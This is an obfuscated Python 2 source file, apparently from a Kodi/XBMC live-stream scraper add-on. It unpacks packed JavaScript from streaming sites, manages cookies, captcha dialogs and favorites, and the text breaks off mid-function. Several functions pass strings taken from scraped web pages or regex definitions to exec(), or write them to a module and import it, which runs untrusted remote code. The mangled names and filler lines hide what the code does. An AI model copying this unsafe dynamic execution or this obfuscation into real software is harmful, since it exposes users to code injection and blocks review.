  if 12 - 12: IIII . O0oO . OOooOOo / OOO0O0O0ooooo
def iiI1i11II ( page_value , regex_for_text = '' , iterations = 1 , total_iteration = 1 ) :
 try :
  OO0oOOo0o = None
  if page_value . startswith ( "http" ) :
   page_value = o0OoOO ( page_value )
  print 'page_value' , page_value
  if regex_for_text and len ( regex_for_text ) > 0 :
   page_value = re . compile ( regex_for_text ) . findall ( page_value ) [ 0 ]
   if 50 - 50: IIII . OoOO . Ooo00oOo00o * o00O0oo + iIiiiI1IiI1I1 % i11iIiiIii
  page_value = i1i1IiIiIi1Ii ( page_value , iterations , total_iteration )
 except : traceback . print_exc ( file = sys . stdout )
 print 'unpacked' , page_value
 if 'sav1live.tv' in page_value :
  page_value = page_value . replace ( 'sav1live.tv' , 'sawlive.tv' )
  print 'sav1 unpacked' , page_value
 return page_value
 if 64 - 64: o0000oOoOoO0o + II1 * II1
def i1i1IiIiIi1Ii ( sJavascript , iteration = 1 , totaliterations = 2 ) :
 print 'iteration' , iteration
 if sJavascript . startswith ( 'var _0xcb8a=' ) :
  i1I = sJavascript . split ( 'var _0xcb8a=' )
  iIIi1IIi = "myarray=" + i1I [ 1 ] . split ( "eval(" ) [ 0 ]
  exec ( iIIi1IIi )
  iiI1I1IIi11i1 = 62
  i1II1iii1i = int ( i1I [ 1 ] . split ( ",62," ) [ 1 ] . split ( ',' ) [ 0 ] )
  OOO0oiII = myarray [ 0 ]
  II1Oo00O0Oo0Oo = myarray [ 3 ]
  with open ( 'temp file' + str ( iteration ) + '.js' , "wb" ) as I1I11i :
   I1I11i . write ( str ( II1Oo00O0Oo0Oo ) )
   if 66 - 66: oO0o0ooO0 . IIiIiII11i + ii11ii1ii . IIii1I
 else :
  if 51 - 51: o00O0oo . IiIIi1I1Iiii
  if "rn p}('" in sJavascript :
   i1I = sJavascript . split ( "rn p}('" )
  else :
   i1I = sJavascript . split ( "rn A}('" )
  print i1I
  if 45 - 45: O00ooooo00 - IiIIi1I1Iiii / OOO0O0O0ooooo . OoOO
  OOO0oiII , iiI1I1IIi11i1 , i1II1iii1i , II1Oo00O0Oo0Oo = ( '' , '0' , '0' , '' )
  if 5 - 5: ii11ii1ii . IIii1I % IIii1I
  iIIi1IIi = "p1,a1,c1,k1=('" + i1I [ 1 ] . split ( ".spli" ) [ 0 ] + ')'
  exec ( iIIi1IIi )
 II1Oo00O0Oo0Oo = II1Oo00O0Oo0Oo . split ( '|' )
 i1I = i1I [ 1 ] . split ( "))'" )
 if 56 - 56: II1 - o00O0oo - O00ooooo00
 if 8 - 8: o0oO0 / o0000oOoOoO0o . IIiIiII11i + OoOO / i11iIiiIii
 if 31 - 31: i11Ii11I1Ii1i - IIii1I + IIII . IiIIi1I1Iiii / O0oO % IIii1I
 if 6 - 6: O0oO * i11iIiiIii % IIii1I % i11iIiiIii + ii11ii1ii / O00ooooo00
 if 53 - 53: o00O0oo + IIii1I
 if 70 - 70: OoOO
 if 67 - 67: II1
 if 29 - 29: OOO0O0O0ooooo - i11iIiiIii - iIiiiI1IiI1I1 + o0000oOoOoO0o * O0oO
 if 2 - 2: O00ooooo00 - i11Ii11I1Ii1i + IIiIiII11i . ii11ii1ii * ii11ii1ii / OOooOOo
 if 93 - 93: O00ooooo00
 if 53 - 53: II1 + IiIIi1I1Iiii + OoOO0ooOOoo0O
 if 24 - 24: IIII - O0oO - IIII * OoOO . II1 / O0oO
 if 66 - 66: IiIIi1I1Iiii
 if 97 - 97: O00ooooo00 - II1 / o0oO0 * IIiIiII11i
 if 55 - 55: ii11ii1ii . IIII
 if 87 - 87: ii11ii1ii % IIii1I
 if 100 - 100: o0oO0 . IIiIiII11i * o0oO0 - IIiIiII11i . o00O0oo * oO0o0ooO0
 if 89 - 89: Ooo00oOo00o + O0oO * o0oO0
 if 28 - 28: II1 . OoOO0ooOOoo0O % OoOO / O00ooooo00 / o0000oOoOoO0o
 if 36 - 36: ii11ii1ii + o00O0oo - O0oO + IIii1I + II1
 if 4 - 4: iIiiiI1IiI1I1 . o00O0oo + oO0o0ooO0 * o0oO0 . i11Ii11I1Ii1i
 if 87 - 87: OOooOOo / Ooo00oOo00o / i11iIiiIii
 OooO0 = ''
 ii1IiIiI1 = ''
 if 74 - 74: OoOO0ooOOoo0O / OoOO % ii11ii1ii
 if 88 - 88: OOooOOo - i11iIiiIii % ii11ii1ii * o00O0oo + OoOO
 OoiIIIiIi1I1i = str ( OoOOoO0oOo ( OOO0oiII , iiI1I1IIi11i1 , i1II1iii1i , II1Oo00O0Oo0Oo , OooO0 , ii1IiIiI1 , iteration ) )
 if 70 - 70: o00O0oo % IIii1I . IiIIi1I1Iiii + IiIIi1I1Iiii - ii11ii1ii % o0oO0
 if 38 - 38: o0oO0 % o0000oOoOoO0o - II1
 if 87 - 87: Ooo00oOo00o % IIiIiII11i
 if 77 - 77: IIii1I - O00ooooo00 . OoOO0ooOOoo0O
 if 26 - 26: ii11ii1ii * O0oO . O00ooooo00
 if iteration >= totaliterations :
  if 59 - 59: OOO0O0O0ooooo + O00ooooo00 - ii11ii1ii
  return OoiIIIiIi1I1i
 else :
  if 62 - 62: i11iIiiIii % o0000oOoOoO0o . O0oO . o0000oOoOoO0o
  return i1i1IiIiIi1Ii ( OoiIIIiIi1I1i , iteration + 1 )
  if 84 - 84: i11iIiiIii * Ooo00oOo00o
def OoOOoO0oOo ( p , a , c , k , e , d , iteration , v = 1 ) :
 if 18 - 18: o0000oOoOoO0o - oO0o0ooO0 - OOooOOo / o0oO0 - OOO0O0O0ooooo
 if 30 - 30: OOO0O0O0ooooo + OoOO + iIiiiI1IiI1I1
 if 14 - 14: ii11ii1ii / o0000oOoOoO0o - IIii1I - OoOO0ooOOoo0O % i11Ii11I1Ii1i
 while ( c >= 1 ) :
  c = c - 1
  if ( k [ c ] ) :
   I1iIiI1IiIIII = str ( I1iiIi111I ( c , a ) )
   if v == 1 :
    p = re . sub ( '\\b' + I1iIiI1IiIIII + '\\b' , k [ c ] , p )
   else :
    p = Iiii1iIii ( p , I1iIiI1IiIIII , k [ c ] )
    if 69 - 69: OoOO0ooOOoo0O % II1 . IIiIiII11i
    if 34 - 34: oO0o0ooO0 * OOooOOo - O0oO - IIiIiII11i - oO0o0ooO0
    if 42 - 42: iIiiiI1IiI1I1 * IIiIiII11i % O00ooooo00 - oO0o0ooO0 % O0oO
    if 36 - 36: i11iIiiIii / OoOO0ooOOoo0O * OoOO * OoOO + oO0o0ooO0 * o00O0oo
    if 32 - 32: Ooo00oOo00o
    if 50 - 50: i11Ii11I1Ii1i + O00ooooo00
 return p
 if 31 - 31: oO0o0ooO0
 if 78 - 78: i11iIiiIii + ii11ii1ii + o0oO0 / ii11ii1ii % IIii1I % O0oO
 if 83 - 83: IIii1I % OOooOOo % ii11ii1ii % o0oO0 . OoOO % OOO0O0O0ooooo
def Iiii1iIii ( source_str , word_to_find , replace_with ) :
 iIiIi1ii = None
 iIiIi1ii = source_str . split ( word_to_find )
 if len ( iIiIi1ii ) > 1 :
  iiiiiII = [ ]
  ii1ii = 0
  for IIiI1i in iIiIi1ii :
   if 6 - 6: OoOO / IIII - o0000oOoOoO0o
   iiiiiII . append ( IIiI1i )
   i1i1ii111 = word_to_find
   if 62 - 62: o00O0oo % o0000oOoOoO0o
   if 54 - 54: OOooOOo % IIII . OOooOOo * o0000oOoOoO0o + OOooOOo % O00ooooo00
   if ii1ii == len ( iIiIi1ii ) - 1 :
    i1i1ii111 = ''
   else :
    if len ( IIiI1i ) == 0 :
     if ( len ( iIiIi1ii [ ii1ii + 1 ] ) == 0 and word_to_find [ 0 ] . lower ( ) not in 'abcdefghijklmnopqrstuvwxyz1234567890_' ) or ( len ( iIiIi1ii [ ii1ii + 1 ] ) > 0 and iIiIi1ii [ ii1ii + 1 ] [ 0 ] . lower ( ) not in 'abcdefghijklmnopqrstuvwxyz1234567890_' ) :
      i1i1ii111 = replace_with
      if 23 - 23: o0oO0 - o0000oOoOoO0o + oO0o0ooO0 - OOooOOo * OOooOOo . IiIIi1I1Iiii
    else :
     if ( iIiIi1ii [ ii1ii ] [ - 1 ] . lower ( ) not in 'abcdefghijklmnopqrstuvwxyz1234567890_' ) and ( ( len ( iIiIi1ii [ ii1ii + 1 ] ) == 0 and word_to_find [ 0 ] . lower ( ) not in 'abcdefghijklmnopqrstuvwxyz1234567890_' ) or ( len ( iIiIi1ii [ ii1ii + 1 ] ) > 0 and iIiIi1ii [ ii1ii + 1 ] [ 0 ] . lower ( ) not in 'abcdefghijklmnopqrstuvwxyz1234567890_' ) ) :
      i1i1ii111 = replace_with
      if 47 - 47: OoOO0ooOOoo0O % IIii1I
   iiiiiII . append ( i1i1ii111 )
   ii1ii += 1
   if 11 - 11: IIiIiII11i % oO0o0ooO0 - Ooo00oOo00o - OoOO0ooOOoo0O + ii11ii1ii
  source_str = '' . join ( iiiiiII )
 return source_str
 if 98 - 98: IIII + oO0o0ooO0 - Ooo00oOo00o
def OOo0oOO0o0oo0 ( num , radix ) :
 if 78 - 78: o0000oOoOoO0o + IIII . O0oO
 I1ii1ii11i1I = ""
 if num == 0 : return '0'
 while num > 0 :
  I1ii1ii11i1I = "0123456789abcdefghijklmnopqrstuvwxyz" [ num % radix ] + I1ii1ii11i1I
  num /= radix
 return I1ii1ii11i1I
 if 91 - 91: IIii1I . ii11ii1ii . OoOO + II1
def I1iiIi111I ( cc , a ) :
 I1iIiI1IiIIII = "" if cc < a else I1iiIi111I ( int ( cc / a ) , a )
 cc = ( cc % a )
 o0o0O0Oo = chr ( cc + 29 ) if cc > 35 else str ( OOo0oOO0o0oo0 ( cc , 36 ) )
 return I1iIiI1IiIIII + o0o0O0Oo
 if 1 - 1: IIii1I + IiIIi1I1Iiii / OOO0O0O0ooooo - IIII % O0oO + O0oO
 if 24 - 24: IIiIiII11i + IiIIi1I1Iiii + o0000oOoOoO0o - II1 + IiIIi1I1Iiii
def oOO0 ( cookieJar ) :
 try :
  O00i1 = ""
  for i11iIIIIIi1 , iiIII1IIiIIII in enumerate ( cookieJar ) :
   O00i1 += iiIII1IIiIIII . name + "=" + iiIII1IIiIIII . value + ";"
 except : pass
 if 19 - 19: IIII - ii11ii1ii / ii11ii1ii + IiIIi1I1Iiii
 return O00i1
 if 98 - 98: IIii1I % o0000oOoOoO0o + o00O0oo . i11Ii11I1Ii1i
 if 99 - 99: OOO0O0O0ooooo + OOO0O0O0ooooo * o00O0oo + OOO0O0O0ooooo * OoOO0ooOOoo0O
def I1Iii1 ( cookieJar , COOKIEFILE ) :
 try :
  II1Iiiiii = os . path . join ( Oooo0000 , COOKIEFILE )
  cookieJar . save ( II1Iiiiii , ignore_discard = True )
 except : pass
 if 80 - 80: IIiIiII11i . oO0o0ooO0
def iii11I ( COOKIEFILE ) :
 if 47 - 47: o00O0oo + i11Ii11I1Ii1i + iIiiiI1IiI1I1 % i11iIiiIii
 OOoOoo00Oo = None
 if COOKIEFILE :
  try :
   II1Iiiiii = os . path . join ( Oooo0000 , COOKIEFILE )
   OOoOoo00Oo = cookielib . LWPCookieJar ( )
   OOoOoo00Oo . load ( II1Iiiiii , ignore_discard = True )
  except :
   OOoOoo00Oo = None
   if 9 - 9: iIiiiI1IiI1I1 * iIiiiI1IiI1I1 . i11iIiiIii * IIii1I
 if not OOoOoo00Oo :
  OOoOoo00Oo = cookielib . LWPCookieJar ( )
  if 18 - 18: Ooo00oOo00o . iIiiiI1IiI1I1 % OOooOOo % oO0o0ooO0
 return OOoOoo00Oo
 if 87 - 87: IIii1I . II1 * OOooOOo
def IiI1ioO0oOOoo00000 ( fun_call , page_data , Cookie_Jar , m ) :
 OOOo = ''
 if i1iiIIiiI111 not in sys . path :
  sys . path . append ( i1iiIIiiI111 )
  if 74 - 74: oO0o0ooO0 - II1 . IiIIi1I1Iiii
 print fun_call
 try :
  III1Ii1i1I1 = 'import ' + fun_call . split ( '.' ) [ 0 ]
  print III1Ii1i1I1 , sys . path
  exec ( III1Ii1i1I1 )
  print 'done'
 except :
  print 'error in import'
  traceback . print_exc ( file = sys . stdout )
 print 'ret_val=' + fun_call
 exec ( 'ret_val=' + fun_call )
 print OOOo
 if 97 - 97: o0oO0 . i11Ii11I1Ii1i - o0oO0 + IIiIiII11i * iIiiiI1IiI1I1
 return str ( OOOo )
 if 10 - 10: oO0o0ooO0 + o00O0oo % II1 - IIiIiII11i
def o00ooO00O ( fun_call , page_data , Cookie_Jar , m ) :
 print 'doEvalFunction'
 OOOo = ''
 if i1iiIIiiI111 not in sys . path :
  sys . path . append ( i1iiIIiiI111 )
 OOOoOo00O = open ( i1iiIIiiI111 + "/LSProdynamicCode.py" , "w" )
 OOOoOo00O . write ( fun_call ) ;
 OOOoOo00O . close ( )
 import LSProdynamicCode
 OOOo = LSProdynamicCode . GetLSProData ( page_data , Cookie_Jar , m )
 return str ( OOOo )
 if 70 - 70: o0000oOoOoO0o - IIII
 if 2 - 2: IIii1I
def i11IIIiI1I ( url ) :
 iiii1 = o0OoOO ( url )
 OO0o0oO0O000o = ""
 I1iI11iii = ""
 oo0oO = "<script.*?src=\"(.*?recap.*?)\""
 OOooOoooOoOo = re . findall ( oo0oO , iiii1 )
 IiIi1iI11 = False
 iiI1iI1I = None
 I1iI11iii = None
 if 27 - 27: OoOO * o0oO0 - Ooo00oOo00o + oO0o0ooO0 * oO0o0ooO0
 if OOooOoooOoOo and len ( OOooOoooOoOo ) > 0 :
  o0OO0O0OO0oO0 = OOooOoooOoOo [ 0 ]
  IiIi1iI11 = True
  if 9 - 9: OoOO0ooOOoo0O % i11iIiiIii / IiIIi1I1Iiii
  IIIiI1ii1IIi = 'challenge.*?\'(.*?)\''
  o0O0oo0o = '\'(.*?)\''
  II11iI1iiI = o0OoOO ( o0OO0O0OO0oO0 )
  OO0o0oO0O000o = re . findall ( IIIiI1ii1IIi , II11iI1iiI ) [ 0 ]
  I1 = 'http://www.google.com/recaptcha/api/reload?c=' ;
  iioO0o = o0OO0O0OO0oO0 . split ( 'k=' ) [ 1 ]
  I1 += OO0o0oO0O000o + '&k=' + iioO0o + '&captcha_k=1&type=image&lang=en-GB'
  I1I1 = o0OoOO ( I1 )
  iiI1iI1I = re . findall ( o0O0oo0o , I1I1 ) [ 0 ]
  O0Oo0 = 'http://www.google.com/recaptcha/api/image?c=' + iiI1iI1I
  if not O0Oo0 . startswith ( "http" ) :
   O0Oo0 = 'http://www.google.com/recaptcha/api/' + O0Oo0
  import random
  iii11i1IIII = random . randrange ( 100 , 1000 , 5 )
  OOooO0OO0 = os . path . join ( Oooo0000 , str ( iii11i1IIII ) + "captcha.img" )
  iI1iIiiiI1I1 = open ( OOooO0OO0 , "wb" )
  iI1iIiiiI1I1 . write ( o0OoOO ( O0Oo0 ) )
  iI1iIiiiI1I1 . close ( )
  OOOO = OoI1IiiiIiI ( captcha = OOooO0OO0 )
  I1iI11iii = OOOO . get ( )
  os . remove ( OOooO0OO0 )
 return iiI1iI1I , I1iI11iii
 if 77 - 77: oO0o0ooO0 / iIiiiI1IiI1I1 - oO0o0ooO0 / o0000oOoOoO0o
def o0OoOO ( url , cookieJar = None , post = None , timeout = 20 , headers = None ) :
 if 97 - 97: o0000oOoOoO0o / OoOO0ooOOoo0O . iIiiiI1IiI1I1
 if 44 - 44: oO0o0ooO0 % o00O0oo . o0oO0
 IiII = urllib2 . HTTPCookieProcessor ( cookieJar )
 O00 = urllib2 . build_opener ( IiII , urllib2 . HTTPBasicAuthHandler ( ) , urllib2 . HTTPHandler ( ) )
 if 18 - 18: IIii1I + o00O0oo * IIiIiII11i - o0000oOoOoO0o / IIiIiII11i
 IIiiIiI1 = urllib2 . Request ( url )
 IIiiIiI1 . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, lKuala Gecko) Chrome/33.0.1750.154 Safari/537.36' )
 if headers :
  for i1i1iII1 , o00iI1i1II in headers :
   IIiiIiI1 . add_header ( i1i1iII1 , o00iI1i1II )
   if 14 - 14: i11Ii11I1Ii1i - IIii1I / OOO0O0O0ooooo % O0oO . OOooOOo
 iiIiIIi = O00 . open ( IIiiIiI1 , post , timeout = timeout )
 ii111IiiI1 = iiIiIIi . read ( )
 iiIiIIi . close ( )
 return ii111IiiI1 ;
 if 18 - 18: OoOO0ooOOoo0O * OoOO0ooOOoo0O % OoOO0ooOOoo0O
def Ii1I1I1i11ii ( str , reg = None ) :
 if reg :
  str = re . findall ( reg , str ) [ 0 ]
 OoOo0oO0o = urllib . unquote ( str [ 0 : len ( str ) - 1 ] ) ;
 o0OoOo00ooO = '' ;
 for OOO00 in range ( len ( OoOo0oO0o ) ) :
  o0OoOo00ooO += chr ( ord ( OoOo0oO0o [ OOO00 ] ) - OoOo0oO0o [ len ( OoOo0oO0o ) - 1 ] ) ;
 o0OoOo00ooO = urllib . unquote ( o0OoOo00ooO )
 print o0OoOo00ooO
 return o0OoOo00ooO
 if 10 - 10: o00O0oo / o00O0oo * i11iIiiIii
def iIiii ( str ) :
 II1III1i1iiI = re . findall ( 'unescape\(\'(.*?)\'' , str )
 print 'js' , II1III1i1iiI
 if ( not II1III1i1iiI == None ) and len ( II1III1i1iiI ) > 0 :
  for I11i11i1 in II1III1i1iiI :
   if 68 - 68: IiIIi1I1Iiii . IiIIi1I1Iiii - OoOO / o00O0oo . i11Ii11I1Ii1i / O00ooooo00
   str = str . replace ( I11i11i1 , urllib . unquote ( I11i11i1 ) )
 return str
 if 12 - 12: OoOO * O00ooooo00 * o00O0oo
i1iiI = 0
def oOo00 ( m , html_page , cookieJar ) :
 global i1iiI
 i1iiI += 1
 I11o0000o0Oo = m [ 'expres' ]
 OOoiIIiiIIIi1I = m [ 'page' ]
 ooo0O0OOo0OoO = re . compile ( '\$LiveStreamCaptcha\[([^\]]*)\]' ) . findall ( I11o0000o0Oo ) [ 0 ]
 if 45 - 45: OOO0O0O0ooooo / O00ooooo00 * OoOO0ooOOoo0O * Ooo00oOo00o
 o0OO0O0OO0oO0 = re . compile ( ooo0O0OOo0OoO ) . findall ( html_page ) [ 0 ]
 print I11o0000o0Oo , ooo0O0OOo0OoO , o0OO0O0OO0oO0
 if not o0OO0O0OO0oO0 . startswith ( "http" ) :
  II11I = 'http://' + "" . join ( OOoiIIiiIIIi1I . split ( '/' ) [ 2 : 3 ] )
  if o0OO0O0OO0oO0 . startswith ( "/" ) :
   o0OO0O0OO0oO0 = II11I + o0OO0O0OO0oO0
  else :
   o0OO0O0OO0oO0 = II11I + '/' + o0OO0O0OO0oO0
   if 31 - 31: oO0o0ooO0
 OOooO0OO0 = os . path . join ( Oooo0000 , str ( i1iiI ) + "captcha.jpg" )
 iI1iIiiiI1I1 = open ( OOooO0OO0 , "wb" )
 print ' c capurl' , o0OO0O0OO0oO0
 IIiiIiI1 = urllib2 . Request ( o0OO0O0OO0oO0 )
 IIiiIiI1 . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1' )
 if 'referer' in m :
  IIiiIiI1 . add_header ( 'Referer' , m [ 'referer' ] )
 if 'agent' in m :
  IIiiIiI1 . add_header ( 'User-agent' , m [ 'agent' ] )
 if 'setcookie' in m :
  print 'adding cookie' , m [ 'setcookie' ]
  IIiiIiI1 . add_header ( 'Cookie' , m [ 'setcookie' ] )
  if 18 - 18: i11Ii11I1Ii1i + oO0o0ooO0
  if 5 - 5: II1 + o00O0oo * iIiiiI1IiI1I1
  if 98 - 98: o0000oOoOoO0o % O00ooooo00 . IIiIiII11i . iIiiiI1IiI1I1 . OoOO / i11iIiiIii
  if 32 - 32: ii11ii1ii + IIiIiII11i . o0oO0
 urllib2 . urlopen ( IIiiIiI1 )
 iiIiIIi = urllib2 . urlopen ( IIiiIiI1 )
 if 41 - 41: OOooOOo . i11iIiiIii / o00O0oo
 iI1iIiiiI1I1 . write ( iiIiIIi . read ( ) )
 iiIiIIi . close ( )
 iI1iIiiiI1I1 . close ( )
 OOOO = OoI1IiiiIiI ( captcha = OOooO0OO0 )
 I1iI11iii = OOOO . get ( )
 return I1iI11iii
 if 98 - 98: OOooOOo % iIiiiI1IiI1I1
def OoO0O000 ( imageregex , html_page , cookieJar , m ) :
 global i1iiI
 i1iiI += 1
 if 14 - 14: Ooo00oOo00o / Ooo00oOo00o * OOO0O0O0ooooo . OoOO0ooOOoo0O
 if 59 - 59: iIiiiI1IiI1I1 * i11iIiiIii
 if not imageregex == '' :
  if html_page . startswith ( "http" ) :
   II11I = o0OoOO ( html_page , cookieJar = cookieJar )
  else :
   II11I = html_page
  o0OO0O0OO0oO0 = re . compile ( imageregex ) . findall ( html_page ) [ 0 ]
 else :
  o0OO0O0OO0oO0 = html_page
  if 'oneplay.tv/embed' in html_page :
   import oneplay
   II11I = o0OoOO ( html_page , cookieJar = cookieJar )
   o0OO0O0OO0oO0 = oneplay . getCaptchaUrl ( II11I )
   if 54 - 54: OOO0O0O0ooooo % II1 - IIiIiII11i
 OOooO0OO0 = os . path . join ( Oooo0000 , str ( i1iiI ) + "captcha.jpg" )
 iI1iIiiiI1I1 = open ( OOooO0OO0 , "wb" )
 print ' c capurl' , o0OO0O0OO0oO0
 IIiiIiI1 = urllib2 . Request ( o0OO0O0OO0oO0 )
 IIiiIiI1 . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1' )
 if 'referer' in m :
  IIiiIiI1 . add_header ( 'Referer' , m [ 'referer' ] )
 if 'agent' in m :
  IIiiIiI1 . add_header ( 'User-agent' , m [ 'agent' ] )
 if 'accept' in m :
  IIiiIiI1 . add_header ( 'Accept' , m [ 'accept' ] )
 if 'setcookie' in m :
  print 'adding cookie' , m [ 'setcookie' ]
  IIiiIiI1 . add_header ( 'Cookie' , m [ 'setcookie' ] )
  if 61 - 61: IiIIi1I1Iiii * O0oO . IiIIi1I1Iiii + IiIIi1I1Iiii / O0oO * OOO0O0O0ooooo
  if 73 - 73: IIII * IIII / i11Ii11I1Ii1i
  if 43 - 43: OoOO . O00ooooo00 . O0oO + OOO0O0O0ooooo * oO0o0ooO0 * OOO0O0O0ooooo
  if 41 - 41: OoOO + oO0o0ooO0 % II1 . OoOO + IIII . IIII
  if 31 - 31: i11iIiiIii + iIiiiI1IiI1I1 . IIII * OOooOOo
 iiIiIIi = urllib2 . urlopen ( IIiiIiI1 )
 if 66 - 66: OOooOOo + O00ooooo00 % iIiiiI1IiI1I1 . OOO0O0O0ooooo * OoOO % OoOO
 iI1iIiiiI1I1 . write ( iiIiIIi . read ( ) )
 iiIiIIi . close ( )
 iI1iIiiiI1I1 . close ( )
 OOOO = OoI1IiiiIiI ( captcha = OOooO0OO0 )
 I1iI11iii = OOOO . get ( )
 return I1iI11iii
 if 87 - 87: o0000oOoOoO0o + ii11ii1ii . IIII - II1
 if 6 - 6: IIii1I * II1
 if 28 - 28: IiIIi1I1Iiii * ii11ii1ii / o0oO0
 if 52 - 52: OOO0O0O0ooooo / ii11ii1ii % IIII * IIiIiII11i % o0000oOoOoO0o
 if 69 - 69: OoOO
 if 83 - 83: ii11ii1ii
 if 38 - 38: o0oO0 + II1 . O00ooooo00
 if 19 - 19: IIII - ii11ii1ii - oO0o0ooO0 - OOooOOo . IIII . o0oO0
 if 48 - 48: IIII + O0oO
 if 60 - 60: o00O0oo + IIII . O0oO / O00ooooo00 . IIii1I
 if 14 - 14: o0000oOoOoO0o
 if 79 - 79: oO0o0ooO0
 if 76 - 76: IIii1I
def Ooi111i1iIi1 ( name , headname ) :
 if 95 - 95: II1 + o00O0oo - OoOO / OoOO . O00ooooo00 . II1
 if 29 - 29: i11Ii11I1Ii1i - O00ooooo00 . o00O0oo - OoOO + i11Ii11I1Ii1i + II1
 O00o0OO = xbmc . Keyboard ( 'default' , 'heading' , True )
 O00o0OO . setDefault ( name )
 O00o0OO . setHeading ( headname )
 O00o0OO . setHiddenInput ( False )
 return O00o0OO . getText ( )
 if 36 - 36: O00ooooo00 / i11Ii11I1Ii1i . IIii1I
 if 12 - 12: oO0o0ooO0
 if 71 - 71: IIiIiII11i . iIiiiI1IiI1I1 . IIiIiII11i - i11Ii11I1Ii1i
 if 45 - 45: O0oO / OOO0O0O0ooooo / OOooOOo * o0000oOoOoO0o
class OoI1IiiiIiI ( xbmcgui . WindowDialog ) :
 def __init__ ( self , * args , ** kwargs ) :
  self . cptloc = kwargs . get ( 'captcha' )
  self . img = xbmcgui . ControlImage ( 335 , 30 , 624 , 60 , self . cptloc )
  self . addControl ( self . img )
  self . kbd = xbmc . Keyboard ( )
  if 18 - 18: IIii1I + o0000oOoOoO0o + IIii1I . OoOO + o0oO0 . i11Ii11I1Ii1i
 def get ( self ) :
  self . show ( )
  time . sleep ( 2 )
  self . kbd . doModal ( )
  if ( self . kbd . isConfirmed ( ) ) :
   I11i1 = self . kbd . getText ( )
   self . close ( )
   return I11i1
  self . close ( )
  return False
  if 7 - 7: OoOO + IIii1I * o00O0oo * o00O0oo / iIiiiI1IiI1I1 - oO0o0ooO0
def oOOO0oo0 ( ) :
 import time
 return str ( int ( time . time ( ) * 1000 ) )
 if 65 - 65: OoOO0ooOOoo0O + OOooOOo + iIiiiI1IiI1I1
def ii1iIi1iIiI1i ( ) :
 import time
 return str ( int ( time . time ( ) ) )
 if 77 - 77: iIiiiI1IiI1I1
def IiiII1iIii111iII ( ) :
 iI1iI1IiIIiI = [ ]
 oOo0Oo0O0O = sys . argv [ 2 ]
 if len ( oOo0Oo0O0O ) >= 2 :
  III1II1i = sys . argv [ 2 ]
  iI1i1IiIIIIi = III1II1i . replace ( '?' , '' )
  if ( III1II1i [ len ( III1II1i ) - 1 ] == '/' ) :
   III1II1i = III1II1i [ 0 : len ( III1II1i ) - 2 ]
  OooOooO0O0o0 = iI1i1IiIIIIi . split ( '&' )
  iI1iI1IiIIiI = { }
  for OOO00 in range ( len ( OooOooO0O0o0 ) ) :
   OOO0o0 = { }
   OOO0o0 = OooOooO0O0o0 [ OOO00 ] . split ( '=' )
   if ( len ( OOO0o0 ) ) == 2 :
    iI1iI1IiIIiI [ OOO0o0 [ 0 ] ] = OOO0o0 [ 1 ]
 return iI1iI1IiIIiI
 if 34 - 34: IIiIiII11i % IiIIi1I1Iiii - OOooOOo + IIII
 if 79 - 79: iIiiiI1IiI1I1 - i11Ii11I1Ii1i . O00ooooo00 + OOO0O0O0ooooo % OOO0O0O0ooooo * IIiIiII11i
def Ii1Ii1I ( ) :
 I1IIII1i = json . loads ( open ( I11 ) . read ( ) )
 o0OOOO00O0Oo = len ( I1IIII1i )
 for OOO00 in I1IIII1i :
  IiI1 = OOO00 [ 0 ]
  oo0oOo = OOO00 [ 1 ]
  oOO0oo = OOO00 [ 2 ]
  try :
   IIiIi1iI = OOO00 [ 3 ]
   if IIiIi1iI == None :
    raise
  except :
   if OOo . getSetting ( 'use_thumb' ) == "true" :
    IIiIi1iI = oOO0oo
   else :
    IIiIi1iI = OOO0OOO00oo
  try : O0OoooO0 = OOO00 [ 5 ]
  except : O0OoooO0 = None
  try : iiIIiiIi1Ii11 = OOO00 [ 6 ]
  except : iiIIiiIi1Ii11 = None
  if 71 - 71: O00ooooo00 - o00O0oo * o0oO0 + OoOO0ooOOoo0O - Ooo00oOo00o % OoOO
  if OOO00 [ 4 ] == 0 :
   iiOOooooO0Oo ( oo0oOo , IiI1 , oOO0oo , IIiIi1iI , '' , '' , '' , 'fav' , O0OoooO0 , iiIIiiIi1Ii11 , o0OOOO00O0Oo )
  else :
   IiIiiI ( IiI1 , oo0oOo , OOO00 [ 4 ] , oOO0oo , OOO0OOO00oo , '' , '' , '' , '' , 'fav' )
   if 63 - 63: IIii1I + o0000oOoOoO0o . Ooo00oOo00o / IIiIiII11i
   if 84 - 84: O00ooooo00
def IiIIiii1I ( name , url , iconimage , fanart , mode , playlist = None , regexs = None ) :
 ooooo0Oo0 = [ ]
 try :
  if 97 - 97: O0oO . OoOO0ooOOoo0O . O0oO
  name = name . encode ( 'utf-8' , 'ignore' )
 except :
  pass
 if os . path . exists ( I11 ) == False :
  i1IIiiiii ( 'Making Favorites File' )
  ooooo0Oo0 . append ( ( name , url , iconimage , fanart , mode , playlist , regexs ) )
  OOo0 = open ( I11 , "w" )
  OOo0 . write ( json . dumps ( ooooo0Oo0 ) )
  OOo0 . close ( )
 else :
  i1IIiiiii ( 'Appending Favorites' )
  OOo0 = open ( I11 ) . read ( )
  ooOoo0O = json . loads ( OOo0 )
  ooOoo0O . append ( ( name , url , iconimage , fanart , mode ) )
  iII = open ( I11 , "w" )
  iII . write ( json . dumps ( ooOoo0O ) )
  iII . close ( )
  if 91 - 91: o0000oOoOoO0o + o0oO0 . o00O0oo
  if 15 - 15: o00O0oo
def O00o0oo0oOO ( name ) :
 ooOoo0O = json . loads ( open ( I11 ) . read ( ) )
 for i11iIIIIIi1 in range ( len ( ooOoo0O ) ) :
  if ooOoo0O [ i11iIIIIIi1 ] [ 0 ] == name :
   del ooOoo0O [ i11iIIIIIi1 ]
   iII = open ( I11 , "w" )
   iII . write ( json . dumps ( ooOoo0O ) )
   iII . close ( )
   break
 xbmc . executebuiltin ( "XBMC.Container.Refresh" )
 if 75 - 75: IIii1I + II1
def oOOO0 ( url ) :
 import urlresolver
 i111I11i1I = urlresolver . HostedMediaFile ( url )
 if i111I11i1I :
  OOOoOO0o = urlresolver . resolve ( url )
  O00oOo0O0o00O = OOOoOO0o
  if isinstance ( O00oOo0O0o00O , list ) :
   for Ii1i1 in O00oOo0O0o00O :
    ooo0oo00O00Oo = OOo . getSetting ( 'quality' )
    if Ii1i1 [ 'quality' ] == 'HD' :
     OOOoOO0o = Ii1i1 [ 'url' ]
     break
